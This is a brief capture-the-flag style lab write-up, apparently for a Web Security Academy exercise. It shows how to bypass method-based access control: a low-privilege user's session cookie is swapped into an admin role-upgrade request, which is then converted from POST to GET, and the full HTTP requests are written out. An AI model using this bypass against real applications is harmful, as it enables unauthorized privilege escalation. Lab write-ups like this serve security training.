---
tags:
  - access-control
---
For this one the trick is simple. For recon, we log in as the admin account and try to promote a user. We capture the request; it looks something like this:

```
POST /admin-roles HTTP/2
Host: 0a2000af040c733980bbb79a002200d6.web-security-academy.net
Cookie: session=Ozd0Sh3Qc2ykAmEhqpnORnQAjfiLzfAh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a2000af040c733980bbb79a002200d6.web-security-academy.net
Sec-Gpc: 1
Referer: https://0a2000af040c733980bbb79a002200d6.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Priority: u=0, i
Te: trailers

username=carlos&action=upgrade
```
So we can see the server checks admin status using the session cookie.

Nowlog in as wiener:peter. Copy wiener's session cookie into the same Repeater request and send the original POST. The response should be "Unauthorized".

Then change the method from POST to POSTX to check whether the server responds differently to different methods. The response changes from "Unauthorized" to "missing parameter". This means the method-based access control only applies to POST, and the request has reached the backend logic.

POSTX is just a diagnostic step, not the final exploit. Now right-click and select "Change request method" to convert the request to GET, change the username parameter to wiener, and send it with wiener's session cookie:

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: lab-session-id.web-security-academy.net
Cookie: session=<wiener-session>
```

Done.